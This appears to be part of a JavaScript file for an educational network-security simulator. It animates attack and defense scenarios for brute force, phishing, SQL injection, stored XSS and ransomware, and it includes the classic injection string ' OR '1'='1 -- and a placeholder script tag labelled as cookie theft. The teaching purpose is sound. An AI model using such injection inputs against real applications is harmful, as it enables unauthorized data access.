+   {title:"Hanging connections closed",narr:"The proxy sees the attacker's connections aren't sending a request in time and closes them on timeout. The slots are freed.",tag:"timeout: closed",tagCls:"safe",compromised:[],route:["attacker","gateway"],kind:"blocked",flood:true,count:12,
+    pkt:P("Slow connection (reset)",L("L7 · HTTP",[["header","not finished"],["result",bad("RST on timeout")]])),
+    tables:[{title:"Connection pool",cols:["used","total"],rows:[["5","256"]]}]},
+   {title:"Site is reachable",narr:"The pool is free and the user connects and gets the page without trouble. The attack couldn't hold the connections.",tag:"attack failed",tagCls:"safe",compromised:[],route:["user","gateway","server"],kind:"normal",
+    pkt:P("HTTP request",L("L7 · HTTP",[["reply","200 OK"]])),
+    tables:[{title:"Connection pool",cols:["used","total"],rows:[["6","256"]]}]},
+  ]},
+
+ brute:{ name:"Password brute force",
+  nodes:{ victim:N(150,110,"User","10.0.0.10","pc"), attacker:N(150,330,"Attacker","10.0.0.66","attacker"),
+          switch:N(430,220,"Switch","L2","switch",-30), gateway:N(660,220,"Gateway","10.0.0.1","router",-32), server:N(882,220,"Login server","203.0.113.5","server") },
+  links:[["victim","switch"],["attacker","switch"],["switch","gateway"],["gateway","server"]],
+  attack:[
+   {title:"Normal login",narr:"The user logs in with the correct password on the first try. The server lets them in.",tag:"normal",tagCls:"",compromised:[],route:["victim","switch","gateway","server"],kind:"normal",
+    pkt:P("POST /login",L("L4 · TCP",[["dst port","443"]]),L("HTTPS",[["user","alice"],["pass","••••••"],["result","200 OK"]])),
+    tables:[{title:"Attempts (admin)",cols:["failures","threshold"],rows:[["0","5"]]}]},
+   {title:"Storm of login attempts",narr:"The attacker tries thousands of passwords against the admin account: dictionaries, leaked databases, brute force. The server answers \"wrong password\" over and over.",tag:"brute force · CAPEC-49",tagCls:"attack",compromised:[],route:["attacker","switch","gateway","server"],kind:"attack",flood:true,count:18,
+    pkt:P("POST /login ×10000",L("HTTPS",[["user","admin"],["pass",bad("guessing")],["result","401 ×N"]])),
+    tables:[{title:"Attempts (admin)",cols:["failures","threshold"],rows:[[bad("9999"),"∞"]]}]},
+   {title:"Password cracked",narr:"The account with a weak password doesn't hold — the attacker guesses it and logs in as admin. The server is compromised.",tag:"account breached",tagCls:"attack",compromised:["server"],route:["attacker","switch","gateway","server"],kind:"attack",
+    pkt:P("POST /login (success)",L("HTTPS",[["user","admin"],["pass",bad("P@ssw0rd")],["result",bad("200 OK")]])),
+    tables:[{title:"Attempts (admin)",cols:["status",""],rows:[[bad("logged in"),""]]}]},
+  ],
+  defend:[
+   {title:"Normal login",narr:"Lockout after 5 failures and mandatory MFA (a second factor) are enabled.",tag:"defense on",tagCls:"safe",compromised:[],route:["victim","switch","gateway","server"],kind:"normal",
+    pkt:P("POST /login + MFA",L("HTTPS",[["user","alice"],["MFA","code valid"],["result","200 OK"]])),
+    tables:[{title:"Login policy",cols:["rule","value"],rows:[["lockout","5 failures"],["MFA","required"]]}]},
+   {title:"Brute force blocked",narr:"After five failures the admin account is temporarily locked, and frequent attempts are cut by a rate limit. The brute force stops.",tag:"lockout + rate-limit",tagCls:"safe",compromised:[],route:["attacker","switch","gateway","server"],kind:"blocked",flood:true,count:18,
+    pkt:P("POST /login (rejected)",L("HTTPS",[["user","admin"],["result",bad("423 Locked")]])),
+    tables:[{title:"Attempts (admin)",cols:["failures","status"],rows:[["5",bad("locked")]]}]},
+   {title:"MFA saves the day even if guessed",narr:"Even if the password were cracked, login requires a second factor the attacker doesn't have. Access is denied.",tag:"attack failed",tagCls:"safe",compromised:[],route:["attacker","switch","gateway","server"],kind:"blocked",
+    pkt:P("POST /login (MFA needed)",L("HTTPS",[["pass","guessed"],["MFA",bad("no code")],["result",bad("denied")]])),
+    tables:[{title:"Login policy",cols:["rule","value"],rows:[["MFA","required"]]}]},
+  ]},
+
+ phishing:{ name:"Phishing &amp; lateral movement",
+  nodes:{ attacker:N(130,90,"Attacker","external","attacker",-40), internet:N(360,90,"Internet","","cloud",-34),
+          firewall:N(590,150,"Firewall","company edge","firewall",-34), employee:N(130,310,"Employee","staff","person",-36),
+          empPC:N(360,310,"Employee PC","10.0.0.10","pc"), server:N(850,300,"Internal server","10.0.5.9","server") },
+  links:[["attacker","internet"],["internet","firewall"],["firewall","empPC"],["employee","empPC"],["firewall","server"]],
+  attack:[
+   {title:"Normal workday",narr:"The employee does their job. The edge firewall blocks attacks coming straight from the internet, so the attacker can't reach the internal server directly.",tag:"normal",tagCls:"",compromised:[],route:["employee","empPC"],kind:"normal",
+    pkt:P("Normal work",L("note",[["employee","using the PC"]])),
+    tables:[{title:"Perimeter",cols:["inbound attack","status"],rows:[["from internet","blocked"]]},{title:"Internal server",cols:["access",""],rows:[["from outside","denied"]]}]},
+   {title:"Phishing email arrives",narr:"The attacker emails a convincing lure — a fake invoice. To the firewall it's ordinary inbound email, so it lands in the employee's inbox.",tag:"Phishing · CAPEC-98",tagCls:"attack",compromised:[],route:["attacker","internet","firewall","empPC"],kind:"attack",
+    pkt:P("Phishing email",L("L7 · SMTP",[["from",bad("spoofed vendor")],["subject","Invoice #4471 overdue"],["attachment",bad("invoice.exe")]])),
+    tables:[{title:"Mail",cols:["message","verdict"],rows:[["fake invoice",bad("delivered")]]}]},
+   {title:"Employee clicks",narr:"The employee opens the attachment and runs it. No software exploit is needed — the person is tricked into launching the malware themselves. The PC is now infected.",tag:"user runs payload",tagCls:"attack",compromised:["empPC"],route:["employee","empPC"],kind:"attack",
+    pkt:P("Payload runs on PC",L("endpoint",[["action","opened invoice.exe"],["result",bad("malware running")]])),
+    tables:[{title:"Employee PC",cols:["state",""],rows:[[bad("infected"),""]]}]},
+   {title:"Foothold: call home",narr:"The malware calls back out to the attacker. Outbound connections are usually allowed, so it slips past the firewall and hands the attacker remote control of the PC.",tag:"C2 · foothold",tagCls:"attack",compromised:["empPC"],route:["empPC","firewall","internet","attacker"],kind:"attack",
+    pkt:P("C2 beacon (outbound)",L("L4 · TCP",[["dst port","443"]]),L("C2",[["channel",bad("attacker gets a shell")]])),
+    tables:[{title:"Firewall",cols:["direction","verdict"],rows:[["outbound 443","allowed"]]}]},
+   {title:"Lateral movement",narr:"From the trusted inside machine the attacker moves to the valuable server using the employee's access, and steals the data. This is how big companies get breached through one ordinary worker.",tag:"lateral movement · CAPEC-560",tagCls:"attack",compromised:["empPC","server"],route:["empPC","firewall","server"],kind:"attack",
+    pkt:P("Reach internal server",L("L7 · SMB",[["src","Employee PC"],["dst","10.0.5.9"],["data",bad("HR / finance files")]])),
+    tables:[{title:"Internal server",cols:["access",""],rows:[[bad("reached from inside"),""]]}]},
+  ],
+  defend:[
+   {title:"Normal workday",narr:"The company trains staff, filters email (SPF/DKIM/DMARC + attachment sandboxing), runs EDR on every PC, and segments the network so staff can't reach sensitive servers by default.",tag:"defense on",tagCls:"safe",compromised:[],route:["employee","empPC"],kind:"normal",
+    pkt:P("Normal work",L("note",[["employee","using the PC"]])),
+    tables:[{title:"Controls",cols:["layer","status"],rows:[["mail filter","on"],["EDR","on"],["segmentation","on"]]}],hint:"Several independent layers — the attacker must beat all of them."},
+   {title:"Email quarantined",narr:"The mail gateway flags the spoofed sender and the executable attachment and quarantines the message. The employee never even sees it.",tag:"mail filter: quarantine",tagCls:"safe",compromised:[],route:["attacker","internet","firewall"],kind:"blocked",
+    pkt:P("Phishing email (blocked)",L("L7 · SMTP",[["from",bad("spoofed")],["DMARC",bad("fail → quarantine")]])),
+    tables:[{title:"Mail",cols:["message","verdict"],rows:[["fake invoice",bad("quarantined")]]}]},
+   {title:"EDR blocks the payload",narr:"If one email slips through and the employee clicks, EDR on the PC recognizes the malware and blocks it from running and from calling out.",tag:"EDR: blocked",tagCls:"safe",compromised:[],route:["empPC","firewall"],kind:"blocked",
+    pkt:P("Payload (killed by EDR)",L("endpoint",[["invoice.exe",bad("blocked by EDR")]])),
+    tables:[{title:"Employee PC",cols:["state",""],rows:[["clean",""]]}]},
+   {title:"Segmentation stops the pivot",narr:"Even a compromised PC can't reach the sensitive server: segmentation and least-privilege deny the connection. The breach is contained to one workstation.",tag:"segmentation: denied",tagCls:"safe",compromised:[],route:["empPC","firewall","server"],kind:"blocked",
+    pkt:P("Pivot attempt (denied)",L("L7 · SMB",[["dst","10.0.5.9"],["verdict",bad("blocked by segmentation")]])),
+    tables:[{title:"Internal server",cols:["access",""],rows:[["from staff VLAN",bad("denied")]]}]},
+  ]},
+
+ sqli:{ name:"SQL injection",
+  nodes:{ attacker:N(150,110,"Attacker","external","attacker"), internet:N(400,220,"Internet","","cloud",-34),
+          web:N(630,220,"Web app","203.0.113.5","server"), db:N(862,220,"Database","users table","server") },
+  links:[["attacker","internet"],["internet","web"],["web","db"]],
+  attack:[
+   {title:"Normal request",narr:"A normal login: the app looks up just the one matching user and returns their row.",tag:"normal",tagCls:"",compromised:[],route:["attacker","internet","web"],kind:"normal",
+    pkt:P("Normal login",L("L7 · HTTP",[["POST","/login"],["user","alice"]]),L("SQL",[["query","SELECT * FROM users WHERE name='alice'"]])),
+    tables:[{title:"Query result",cols:["rows",""],rows:[["1 (alice)",""]]}]},
+   {title:"Malicious input",narr:"Instead of a name, the attacker types a SQL fragment into the username field.",tag:"SQL injection · CAPEC-66",tagCls:"attack",compromised:[],route:["attacker","internet","web"],kind:"attack",
+    pkt:P("Malicious input",L("L7 · HTTP",[["field",bad("' OR '1'='1 --")]])),
+    tables:[{title:"Input",cols:["field","value"],rows:[["username",bad("' OR '1'='1 --")]]}]},
+   {title:"Query manipulated",narr:"The app pastes the input straight into the SQL text, so the WHERE clause is always true and the database returns every row instead of one.",tag:"always-true WHERE",tagCls:"attack",compromised:["db"],route:["web","db","web"],kind:"attack",
+    pkt:P("Injected query",L("SQL",[["query",bad("… WHERE name='' OR '1'='1'")],["returns",bad("all users")]])),
+    tables:[{title:"Query result",cols:["rows",""],rows:[[bad("all users dumped"),""]]}]},
+   {title:"Data stolen",narr:"The attacker dumps the users table — emails and password hashes — straight out of the database.",tag:"data breach",tagCls:"attack",compromised:["db"],route:["db","web","internet","attacker"],kind:"attack",
+    pkt:P("Exfiltrate table",L("data",[["users",bad("emails + password hashes")]])),
+    tables:[{title:"Database",cols:["state",""],rows:[[bad("breached"),""]]}]},
+  ],
+  defend:[
+   {title:"Normal request",narr:"The app uses parameterized queries (prepared statements): input is always treated as data, never as SQL. The DB account also has least privilege.",tag:"defense on",tagCls:"safe",compromised:[],route:["attacker","internet","web"],kind:"normal",
+    pkt:P("Normal login",L("SQL",[["query","SELECT * FROM users WHERE name=?"],["param","alice"]])),
+    tables:[{title:"DB account",cols:["rights",""],rows:[["read-only, scoped",""]]}],hint:"Input can never change the query's structure."},
+   {title:"Injection neutralized",narr:"The same ' OR '1'='1 is sent, but as a bound parameter it's just a literal string — the app looks for a user literally named that and finds none.",tag:"treated as data",tagCls:"safe",compromised:[],route:["attacker","internet","web"],kind:"blocked",
+    pkt:P("Injection (as data)",L("SQL",[["param",bad("' OR '1'='1")],["returns","0 rows"]])),
+    tables:[{title:"Query result",cols:["rows",""],rows:[["0",""]]}]},
+   {title:"Database safe",narr:"Nothing leaks: the query returned nothing and a WAF logged the attempt. The database is untouched.",tag:"attack failed",tagCls:"safe",compromised:[],route:["web","db","web"],kind:"normal",
+    pkt:P("Query",L("SQL",[["returns","0 rows"]])),
+    tables:[{title:"Database",cols:["state",""],rows:[["intact",""]]}]},
+  ]},
+
+ xss:{ name:"Cross-site scripting (XSS)",
+  nodes:{ attacker:N(150,110,"Attacker","posts comment","attacker"), web:N(460,220,"Forum server","stores posts","server"), victim:N(790,220,"Victim","reads page","pc") },
+  links:[["attacker","web"],["web","victim"]],
+  attack:[
+   {title:"Normal post",narr:"Users post comments and everyone reads them — normal site behavior.",tag:"normal",tagCls:"",compromised:[],route:["attacker","web"],kind:"normal",
+    pkt:P("Normal comment",L("L7 · HTTP",[["POST","/comment"],["body","Nice article!"]])),
+    tables:[{title:"Stored post",cols:["content",""],rows:[["Nice article!",""]]}]},
+   {title:"Script injected",narr:"The attacker posts a comment that contains a <script> tag instead of plain text.",tag:"Stored XSS · CAPEC-592",tagCls:"attack",compromised:[],route:["attacker","web"],kind:"attack",
+    pkt:P("Malicious comment",L("L7 · HTTP",[["body",bad("<script>steal cookie<\/script>")]])),
+    tables:[{title:"Stored post",cols:["content",""],rows:[[bad("<script>…<\/script>"),""]]}]},
+   {title:"Served unsanitized",narr:"The server stores and serves the comment as-is, so the script is embedded in the page for every reader.",tag:"no output encoding",tagCls:"attack",compromised:[],route:["web","victim"],kind:"attack",
+    pkt:P("Page with script",L("L7 · HTTP",[["page",bad("contains attacker script")]])),
+    tables:[{title:"Page",cols:["sanitized",""],rows:[[bad("no — script is active"),""]]}]},
+   {title:"Victim's browser runs it",narr:"When the victim opens the page their browser executes the attacker's script in the site's context. It steals the session cookie and sends it to the attacker, who can now act as the victim.",tag:"session hijack",tagCls:"attack",compromised:["victim"],route:["victim","web","attacker"],kind:"attack",
+    pkt:P("Cookie exfiltration",L("script",[["runs in","victim's browser"],["sends",bad("session cookie → attacker")]])),
+    tables:[{title:"Victim session",cols:["state",""],rows:[[bad("hijacked"),""]]}]},
+  ],
+  defend:[
+   {title:"Normal post",narr:"The site encodes all user output, sets a strict Content-Security-Policy, and marks cookies HttpOnly so scripts can't read them.",tag:"defense on",tagCls:"safe",compromised:[],route:["attacker","web"],kind:"normal",
+    pkt:P("Comment",L("L7 · HTTP",[["body","(encoded on output)"]])),
+    tables:[{title:"Controls",cols:["layer","status"],rows:[["output encoding","on"],["CSP","on"],["HttpOnly cookie","on"]]}],hint:"User content is rendered as text, never as code."},
+   {title:"Script shown as text",narr:"The attacker's script is stored but rendered as harmless text — the browser displays the tag instead of running it, and CSP would block inline scripts anyway.",tag:"encoded + CSP",tagCls:"safe",compromised:[],route:["web","victim"],kind:"blocked",
+    pkt:P("Page (safe)",L("L7 · HTTP",[["script tag",bad("shown as text")],["CSP","blocks inline"]])),
+    tables:[{title:"Page",cols:["sanitized",""],rows:[["yes",""]]}]},
+   {title:"Session safe",narr:"Even if a script ran, HttpOnly keeps it away from the cookie. The victim's session is untouched.",tag:"attack failed",tagCls:"safe",compromised:[],route:["victim","web"],kind:"normal",
+    pkt:P("Victim views page",L("cookie",[["HttpOnly","script can't read it"]])),
+    tables:[{title:"Victim session",cols:["state",""],rows:[["safe",""]]}]},
+  ]},
+
+ ransom:{ name:"Ransomware",
+  nodes:{ attacker:N(140,100,"Attacker","operator","attacker"), internet:N(370,100,"Internet","","cloud",-34),
+          empPC:N(370,310,"Employee PC","10.0.0.10","pc"), switch:N(610,310,"Switch","file shares","switch",-30), server:N(850,310,"File server","data share","server") },
+  links:[["attacker","internet"],["internet","empPC"],["empPC","switch"],["switch","server"]],
+  attack:[
+   {title:"Normal day",narr:"Staff open files on the shared file server over the network — a normal day.",tag:"normal",tagCls:"",compromised:[],route:["empPC","switch","server"],kind:"normal",
+    pkt:P("Open file",L("L7 · SMB",[["read","report.docx"]])),
+    tables:[{title:"Files",cols:["PC","server"],rows:[["ok","ok"]]}]},
+   {title:"Infection",narr:"The employee runs a malicious file (from a phishing email or download). The ransomware starts on their PC.",tag:"Ransomware · CAPEC-549",tagCls:"attack",compromised:["empPC"],route:["internet","empPC"],kind:"attack",
+    pkt:P("Dropper runs",L("endpoint",[["file",bad("update.exe")],["result",bad("ransomware active")]])),
+    tables:[{title:"Files",cols:["PC","server"],rows:[[bad("encrypting"),"ok"]]}]},
+   {title:"Spread and encrypt",narr:"Using the employee's own access to the network shares, it reaches the file server and encrypts everything it can — one PC takes down shared company data.",tag:"encrypting shares",tagCls:"attack",compromised:["empPC","server"],route:["empPC","switch","server"],kind:"attack",flood:true,count:14,
+    pkt:P("Encrypt shares",L("L7 · SMB",[["target","data share"],["action",bad("encrypting files")]])),
+    tables:[{title:"Files",cols:["PC","server"],rows:[[bad("encrypted"),bad("encrypted")]]}]},
+   {title:"Ransom note",narr:"The files are locked and a ransom note demands payment for the key. Without backups the data may be lost for good.",tag:"files locked",tagCls:"attack",compromised:["empPC","server"],route:["empPC","switch","server"],kind:"attack",
+    pkt:P("Ransom note",L("note",[["message",bad("pay to decrypt")]])),
+    tables:[{title:"Recovery",cols:["offline backups",""],rows:[[bad("none"),""]]}]},
+  ],
+  defend:[
+   {title:"Normal day",narr:"The company keeps offline backups, segments the network, limits each user's share access, and runs EDR on endpoints.",tag:"defense on",tagCls:"safe",compromised:[],route:["empPC","switch","server"],kind:"normal",
+    pkt:P("Open file",L("L7 · SMB",[["read","report.docx"]])),
+    tables:[{title:"Controls",cols:["layer","status"],rows:[["offline backups","on"],["EDR","on"],["least privilege","on"]]}],hint:"Even a successful infection can be contained and restored."},
+   {title:"EDR stops it",narr:"EDR spots the mass-encryption behavior and kills the process before it spreads. The file server is never touched.",tag:"EDR: blocked",tagCls:"safe",compromised:[],route:["empPC","switch"],kind:"blocked",flood:true,count:14,
+    pkt:P("Encryption (blocked)",L("endpoint",[["behavior",bad("mass file writes")],["action","killed by EDR"]])),
+    tables:[{title:"Files",cols:["PC","server"],rows:[["isolated","ok"]]}]},
+   {title:"Restore from backup",narr:"If a PC is lost, offline backups restore it, and segmentation kept the file server safe. No ransom paid.",tag:"attack contained",tagCls:"safe",compromised:[],route:["server","switch","empPC"],kind:"normal",
+    pkt:P("Restore",L("backup",[["source","offline backup"]])),
+    tables:[{title:"Recovery",cols:["offline backups",""],rows:[["restored",""]]}]},
+  ]},
+};
+
+// ---------- Engine ----------
+let cur,scen,NODES,LINKS,steps=[],defense=false,idx=-1,playing=false,playTimer=null,anim=null,selected=null;
+const svg=document.getElementById("canvas");
+let nodeEls={};
+
+function drawNetwork(){
+  let s=`<defs><marker id="cap" markerWidth="4" markerHeight="4" refX="2" refY="2"><circle cx="2" cy="2" r="2" fill="#5a4f82"/></marker></defs>`;
+  for(const [a,b] of LINKS){ const n1=NODES[a],n2=NODES[b];
+    s+=`<line x1="${n1.x}" y1="${n1.y}" x2="${n2.x}" y2="${n2.y}" stroke="#4a4168" stroke-width="2.5" marker-start="url(#cap)" marker-end="url(#cap)"/>`; }
+  for(const id in NODES){ const n=NODES[id];
+    s+=`<g transform="translate(${n.x},${n.y})">
+      <circle id="ring-${id}" r="44" fill="none" stroke="var(--currant)" stroke-width="3" opacity="0"/>
+      ${iconMarkup(n.kind)}
+      <text x="0" y="${n.ly}" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--cotton)" font-family="Space Grotesk, sans-serif">${n.label}</text>
+      <text x="0" y="46" text-anchor="middle" font-size="10" fill="var(--stone)" font-family="JetBrains Mono, monospace">${n.sub}</text>
+    </g>`; }
+  svg.innerHTML=s;
+  nodeEls={}; for(const id in NODES) nodeEls[id]={ring:svg.querySelector(`#ring-${id}`)};
+}
+function routePoints(route){ return route.map(id=>({x:NODES[id].x,y:NODES[id].y})); }
+function segLen(p,q){ return Math.hypot(q.x-p.x,q.y-p.y); }
+function lensOf(pts){ const lens=[]; let total=0; for(let i=0;i<pts.length-1;i++){const Ln=segLen(pts[i],pts[i+1]); lens.push(Ln); total+=Ln;} return {lens,total}; }
+function posAt(t,pts,lens,total){ let d=t*total,i=0; while(i<lens.length-1 && d>lens[i]){d-=lens[i];i++;} const p=pts[i],q=pts[i+1]||pts[i],f=lens[i]?d/lens[i]:0; return {x:p.x+(q.x-p.x)*f,y:p.y+(q.y-p.y)*f}; }
+function clearPacket(){ if(anim){cancelAnimationFrame(anim.raf); anim=null;} const o=svg.querySelector("#pkt"); if(o) o.remove(); }
+
+function runPacket(step,loop){
+  clearPacket();
+  const pts=routePoints(step.route); const {lens,total}=lensOf(pts);
+  const g=document.createElementNS(SVGNS,"g"); g.setAttribute("id","pkt"); svg.appendChild(g);
+  if(step.flood){
+    const color=step.kind==="blocked"?"#2DD4BF":"#F0B445";
+    const n=step.count||16, movers=[];
+    for(let k=0;k<n;k++){ const c=document.createElementNS(SVGNS,"g"); c.style.cursor="pointer";
+      c.innerHTML=`<circle r="8" fill="${color}" opacity="0.2"/><circle r="4.2" fill="${color}"/>`;
+      c.addEventListener("click",()=>{selected=step.pkt; renderOSI();}); g.appendChild(c); movers.push({el:c,phase:k/n}); }
+    const dur=1500; let start=null;
+    function frame(ts){ if(!start)start=ts; const base=(ts-start)/dur;
+      for(const m of movers){ const t=(base+m.phase)%1; const p=posAt(t,pts,lens,total); m.el.setAttribute("transform",`translate(${p.x},${p.y})`); }
+      anim.raf=requestAnimationFrame(frame); }
+    anim={raf:requestAnimationFrame(frame)}; return;
+  }
+  const color=step.kind==="attack"?"#E11D29":step.kind==="blocked"?"#2DD4BF":"#FFA577";
+  g.style.cursor="pointer";
+  g.innerHTML=`<circle r="12" fill="${color}" opacity="0.25"/><circle r="6" fill="${color}"/><circle r="6" fill="none" stroke="#fff" stroke-width="1" opacity="0.4"/>`;
+  g.addEventListener("click",()=>{selected=step.pkt; renderOSI();});
+  const dur=step.kind==="blocked"?1100:1800; let start=null;
+  function frame(ts){ if(!start) start=ts; let t=(ts-start)/dur;
+    if(t>=1){ if(loop&&playing){start=ts;t=0;} else t=1; }
+    const p=posAt(t,pts,lens,total); g.setAttribute("transform",`translate(${p.x},${p.y})`);
+    if(t<1||(loop&&playing)) anim.raf=requestAnimationFrame(frame); }
+  anim={raf:requestAnimationFrame(frame)};
+}
+function cell(c){ const b=c&&typeof c==="object"&&c.bad; const v=c&&typeof c==="object"?c.v:c; return {b,v}; }
+function renderState(s){
+  let h="";
+  for(const t of (s.tables||[])){
+    h+=`<h3>${t.title}</h3><table><thead><tr>`+t.cols.map(c=>`<th>${c}</th>`).join("")+`</tr></thead><tbody>`;
+    for(const row of t.rows){ h+="<tr>"+row.map(c=>{const{b,v}=cell(c); return `<td class="${b?'bad':''}">${v}</td>`;}).join("")+"</tr>"; }
+    h+="</tbody></table>";
+  }
+  document.getElementById("stateTables").innerHTML=h;
+  document.getElementById("stateHint").textContent=s.hint||"";
+}
+function renderOSI(){
+  const box=document.getElementById("osi");
+  if(!selected){ box.innerHTML='<div class="empty">Click a packet on the canvas to break it down by layer.</div>'; return; }
+  let h=`<div style="color:var(--stone);margin-bottom:4px">${selected.label}</div>`;
+  for(const Ly of selected.layers){ h+=`<div class="layer"><div class="lh"><span>${Ly.name}</span></div>`;
+    for(const row of Ly.rows){ const {b,v}=cell(row[1]); const isBad=b||row[2]==="bad";
+      h+=`<div class="row"><span class="k">${row[0]}</span><span class="v${isBad?' bad':''}">${v}</span></div>`; }
+    h+=`</div>`; }
+  box.innerHTML=h;
+}
+function showStep(i){
+  idx=Math.max(0,Math.min(steps.length-1,i)); const s=steps[idx];
+  document.getElementById("stepTitle").textContent=s.title;
+  document.getElementById("narr").textContent=s.narr;
+  document.getElementById("tag").innerHTML=`<span class="tag ${s.tagCls}">${s.tag}</span>`;
+  document.getElementById("stepno").textContent=`${idx+1} / ${steps.length}`;
+  document.getElementById("bar").style.width=`${(idx+1)/steps.length*100}%`;
+  renderState(s);
+  for(const id in nodeEls) nodeEls[id].ring.setAttribute("opacity", s.compromised.includes(id)?0.9:0);
+  selected=s.pkt; renderOSI(); runPacket(s,playing); renderTerm();
+  document.getElementById("prev").disabled=idx===0;
+  document.getElementById("next").disabled=idx===steps.length-1 && !playing;
+}
+function stopPlay(){ playing=false; if(playTimer){clearInterval(playTimer);playTimer=null;} document.getElementById("play").textContent="▶ Play"; }
+function play(){ if(playing){stopPlay(); runPacket(steps[idx],false); return;}
+  playing=true; document.getElementById("play").textContent="⏸ Pause";
+  if(idx>=steps.length-1) idx=-1; advance(); playTimer=setInterval(advance,2700); }
+function advance(){ if(idx>=steps.length-1){stopPlay(); runPacket(steps[idx],false); return;} showStep(idx+1); }
+function setDefense(on){ defense=on; steps=on?scen.defend:scen.attack;
+  const sw=document.getElementById("defense"); sw.classList.toggle("on",on); sw.setAttribute("aria-checked",on);
+  stopPlay(); idx=-1; showStep(0); }
+function loadScenario(key){
+  cur=key; scen=SCENARIOS[key]; NODES=scen.nodes; LINKS=scen.links;
+  defense=false; const sw=document.getElementById("defense"); sw.classList.remove("on"); sw.setAttribute("aria-checked","false");
+  const hw=document.getElementById("howText"); if(hw&&typeof META!=="undefined"&&META[key]) hw.textContent=META[key].how||"";
+  if(typeof renderCodePanel==="function") renderCodePanel();
+  drawNetwork(); steps=scen.attack; stopPlay(); idx=-1; showStep(0);
+}
+
+// ---------- Sandbox ----------
+let sbDevices=[], sbLinks=[], sbTool="move", sbSel=null, sbLinkFrom=null, sbPktFrom=null, sbCounter=0, sbDrag=null, sbAnim=null, dragKind=null;
+const sbDef={ pc:["PC","ip"], attacker:["Attacker","ip"], person:["Employee","staff"], switch:["Switch","L2"], router:["Router","gw"], server:["Server","ip"], cloud:["Internet","WWW"], firewall:["Firewall","L4"], ap:["Access Point","Wi-Fi"] };
+const sbName={pc:"PC",attacker:"Attacker",person:"Employee",switch:"Switch",router:"Router",server:"Server",cloud:"Internet",firewall:"Firewall",ap:"Access Point"};
+const PALETTE=["pc","attacker","person","server","switch","router","ap","firewall","cloud"];
+const clamp=(v,a,b)=>Math.max(a,Math.min(b,v));
+function sbDev(id){ return sbDevices.find(d=>d.id===id); }
+function sbCount(k){ return sbDevices.filter(d=>d.kind===k).length; }
+function sbMk(kind,x,y){ const [lb,base]=sbDef[kind]; const n=sbCount(kind)+1;
+  const hostN=sbDevices.filter(d=>["pc","attacker","server"].includes(d.kind)).length+10;
+  const sub = base==="ip" ? "10.0.0."+hostN : base;
+  return {id:++sbCounter, kind, x, y, label:n>1?lb+" "+n:lb, sub, def:new Set(), hacked:false}; }
+function sbInit(){
+  sbDevices=[]; sbLinks=[]; sbCounter=0; sbSel=null; sbLinkFrom=null; sbPktFrom=null; sbTool="move";
+  const a=sbMk("pc",150,120); sbDevices.push(a); const b=sbMk("attacker",150,330); sbDevices.push(b);
+  const c=sbMk("switch",430,220); sbDevices.push(c); const d=sbMk("router",700,220); sbDevices.push(d);
+  sbLinks=[[a.id,c.id],[b.id,c.id],[c.id,d.id]];
+  sbSyncTools(); sbRender(); sbInspect();
+}
+function toSvg(e){ const r=svg.getBoundingClientRect(); return {x:(e.clientX-r.left)/r.width*960, y:(e.clientY-r.top)/r.height*440}; }
+function sbAnimClear(){ if(sbAnim){cancelAnimationFrame(sbAnim);sbAnim=null;} const o=svg.querySelector("#sbpkt"); if(o)o.remove(); }
+function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/"/g,'&quot;').replace(/</g,'&lt;'); }
+
+function sbRender(){
+  sbAnimClear();
+  let s=`<defs><marker id="cap" markerWidth="4" markerHeight="4" refX="2" refY="2"><circle cx="2" cy="2" r="2" fill="#5a4f82"/></marker></defs>`;
+  s+=`<rect class="sbbg" x="0" y="0" width="960" height="440" fill="transparent"/>`;
+  sbLinks.forEach((lk,i)=>{ const a=sbDev(lk[0]),b=sbDev(lk[1]); if(!a||!b)return;
+    s+=`<line class="sblink" data-i="${i}" x1="${a.x}" y1="${a.y}" x2="${b.x}" y2="${b.y}" stroke="#4a4168" stroke-width="${sbTool==='delete'?6:2.5}" marker-start="url(#cap)" marker-end="url(#cap)"/>`; });
+  for(const d of sbDevices){ const sel=sbSel===d.id||sbLinkFrom===d.id||sbPktFrom===d.id;
+    s+=`<g class="sbdev" data-id="${d.id}" transform="translate(${d.x},${d.y})">
+      <rect x="-42" y="-44" width="84" height="94" rx="12" fill="transparent"/>
+      ${sel?`<rect x="-40" y="-42" width="80" height="90" rx="12" fill="none" stroke="var(--violet)" stroke-width="2" stroke-dasharray="4 4"/>`:""}
+      ${d.hacked?`<circle r="44" fill="none" stroke="var(--currant)" stroke-width="3"/>`:""}
+      ${(d.def&&d.def.size)?`<circle cx="33" cy="-34" r="6" fill="var(--teal)"/>`:""}
+      ${iconMarkup(d.kind)}
+      <text x="0" y="-38" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--cotton)" font-family="Space Grotesk, sans-serif">${esc(d.label)}</text>
+      <text x="0" y="46" text-anchor="middle" font-size="10" fill="var(--stone)" font-family="JetBrains Mono, monospace">${esc(d.sub)}</text>
+    </g>`; }
+  svg.innerHTML=s;
+  const bg=svg.querySelector(".sbbg");
+  if(bg) bg.addEventListener("pointerdown",()=>{ if(sbTool==="move"){sbSel=null;sbLinkFrom=null;sbPktFrom=null;sbRender();sbInspect();}});
+  svg.querySelectorAll(".sbdev").forEach(g=>{ g.style.cursor=sbTool==="move"?"grab":(sbTool==="delete"||sbTool==="code")?"pointer":"crosshair";
+    g.addEventListener("pointerdown",ev=>sbDevDown(ev,+g.dataset.id));
+    g.addEventListener("dblclick",ev=>{ev.preventDefault(); openEditor(+g.dataset.id);}); });
+  if(sbTool==="delete") svg.querySelectorAll(".sblink").forEach(l=>{ l.style.cursor="pointer";
+    l.addEventListener("pointerdown",ev=>{ev.stopPropagation(); sbLinks.splice(+l.dataset.i,1); sbRender();}); });
+}
+function sbDevDown(ev,id){ ev.preventDefault(); ev.stopPropagation(); const d=sbDev(id); if(!d)return;
+  if(sbTool==="move"){ sbSel=id; const p=toSvg(ev); sbDrag={id,ox:d.x-p.x,oy:d.y-p.y,moved:false};
+    window.addEventListener("pointermove",sbMove); window.addEventListener("pointerup",sbUp); sbRender(); sbInspect(); }
+  else if(sbTool==="link"){ if(sbLinkFrom==null) sbLinkFrom=id; else { if(sbLinkFrom!==id) sbAddLink(sbLinkFrom,id); sbLinkFrom=null; } sbRender(); }
+  else if(sbTool==="delete"){ sbDevices=sbDevices.filter(x=>x.id!==id); sbLinks=sbLinks.filter(l=>l[0]!==id&&l[1]!==id); if(sbSel===id)sbSel=null; sbRender(); sbInspect(); }
+  else if(sbTool==="packet"){ if(sbPktFrom==null){ sbPktFrom=id; toast("Now click the destination"); sbRender(); }
